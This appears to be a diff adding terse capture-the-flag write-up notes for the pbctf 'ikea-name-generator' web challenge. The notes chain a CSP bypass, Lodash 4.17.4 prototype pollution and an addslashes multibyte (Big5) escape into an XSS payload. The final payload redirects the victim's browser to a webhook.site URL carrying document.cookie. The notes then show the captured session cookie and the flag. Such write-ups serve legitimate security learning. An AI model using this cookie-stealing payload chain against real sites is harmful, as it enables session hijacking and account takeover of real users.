@@ -1,0 +1,86 @@
+# Source: https://w0y.at/category/writeup.html
+
+index.html
+	# Lodash
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.4/lodash.min.js"></script>
+
+http://ikea-name-generator.chal.perfect.blue/config.php?name=John
+	CONFIG = {
+	  url: "/get_name.php",
+	  name: "John"
+	}
+
+app.js
+	This script redirects to /?name=<name> after clicking the submit button, then it sends the name via POST to the url attribute of the CONFIG object obtained after evaluating the output of /config.php?name=<name>. The get_name.php page returns a JSON containing our Ikea name, e.g., {"text":"\u00c5SUN"} that is parsed by app.js and merged (using an utility function provided by the Lodash library) with the default_config object into the config variable, to obtain something like:
+	```
+	config = {
+	    "style": "color: red;",
+	    "text": "\u00c5SUN"
+	}
+	```
+	Finally, an iframe is created with src set to sandbox.php and its content is populated with the newly created config structure.
+
+Cannot trigger XSS with CSP
+
+Content-Security-Policy:
+- /
+	default-src 'none';script-src 'self' https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.4/lodash.min.js;connect-src 'self';frame-src 'self';img-src 'self';style-src 'self' https://maxcdn.bootstrapcdn.com/;base-uri 'none';
+- 404.php
+	default-src 'none'
+- sandbox.php
+	default-src 'none';script-src 'self' https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js;style-src 'self' https://maxcdn.bootstrapcdn.com/;connect-src https:;base-uri 'none'
+
+And
+	Content-Type: text/html; charset=UTF-8
+
+Script gadget attack on /sandbox.php because of AngularJS
+	Source:
+		Gadget: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-csp-bypasses
+		Research: https://research.google/pubs/pub46450/
+
+Lodash 4.17.4 Prototype Pollution
+	Source:
+		- https://snyk.io/test/npm/lodash/4.17.4?tab=issues
+		- https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications
+
+Try to get this
+	CONFIG = {
+	  url: "/get_name.php",
+	  name: "John",
+	  url: "/404.php?msg=<data>"
+	}
+
+addslashes() in config.php
+	Source:
+		- https://shiflett.org/blog/2006/addslashes-versus-mysql-real-escape-string
+		- https://en.wikipedia.org/wiki/GBK_(character_encoding)
+
+	name=John%22,%20url:%20%22/404.php?msg=foobar
+	=> name: "John\", url: \"\/404.php?msg=foobar"
+
+http://ikea-name-generator.chal.perfect.blue/config.php?name=%aa%22,%20foo
+	CONFIG = {
+	  url: "/get_name.php",
+	  name: "歿", foo"
+	}
+	document.characterSet => "Big5"
+
+http://ikea-name-generator.chal.perfect.blue/?name=%aa%22,%20foo
+	document.characterSet => "UTF-8"
+	CONFIG
+		{url: "/get_name.php", name: "�", foo"}
+
+http://ikea-name-generator.chal.perfect.blue/config.php?name=%bf%22,foo:window.location=`https://webhook.site/c5c3b319-bf6d-4e41-a75c-b1c7ef87665e/${document.cookie}`%3c!--
+	CONFIG = {
+	  url: "/get_name.php",
+	  name: "璞",foo:window.location=`https:\/\/webhook.site\/c5c3b319-bf6d-4e41-a75c-b1c7ef87665e\/${document.cookie}`<!--"
+	}
+
+Payload
+	http://ikea-name-generator.chal.perfect.blue/?name=%3Cscript%20charset=big5%20src=config.php?name=%bf%22,foo:window.location=`https://webhook.site/c5c3b319-bf6d-4e41-a75c-b1c7ef87665e/${document.cookie}`%3c!--
+
+/report.php
+	session=be2171a063883cd6f356707eb8dd601d6d8ac26a
+
+/login.php with cookie
+	pbctf{pr0t0typ3_p0llut10n_1s_4_f34tur3}
